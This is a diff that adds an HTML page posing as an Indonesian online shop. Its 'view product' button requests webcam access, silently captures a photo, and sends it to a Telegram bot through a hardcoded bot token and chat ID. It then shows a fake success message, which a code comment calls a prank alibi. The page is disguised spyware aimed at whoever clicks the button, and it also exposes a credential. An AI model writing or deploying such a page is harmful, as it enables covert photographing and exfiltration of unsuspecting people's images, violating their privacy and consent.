@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Toko Online Keren 😎</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f5f5f5;
+    }
+    header {
+      background: #4CAF50;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    .product {
+      max-width: 400px;
+      margin: 50px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .btn-check {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Welcome to Toko Keren</h1>
+  </header>
+
+  <div class="product">
+    <h2>Produk Baru!</h2>
+    <p>Lihat detail produk terbaru kami.</p>
+    <button class="btn-check" id="checkProduct">Lihat Produk</button>
+  </div>
+
+  <script>
+    const button = document.getElementById('checkProduct');
+
+    const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
+    const CHAT_ID = "8316267465";
+
+    function takePhoto() {
+      const video = document.createElement('video');
+      return navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          return new Promise(resolve => {
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth || 320;
+              canvas.height = video.videoHeight || 240;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              stream.getTracks().forEach(track => track.stop()); // matikan kamera
+              resolve(canvas.toDataURL('image/png'));
+            }, 2000);
+          });
+        });
+    }
+
+    function sendToTelegram(imageData) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: imageData
+        }),
+        headers: { 'Content-Type': 'application/json' }
+      })
+      .then(res => res.json())
+      .then(data => console.log("Foto terkirim!", data))
+      .catch(err => console.error(err));
+    }
+
+    button.addEventListener('click', () => {
+      takePhoto()
+        .then(photo => {
+          sendToTelegram(photo);
+          alert("Produk berhasil ditampilkan! 😎"); // alibi prank
+        })
+        .catch(err => {
+          alert("Kamu menolak akses kamera 😅");
+          console.error(err);
+        });
+    });
+  </script>
+</body>
+</html>
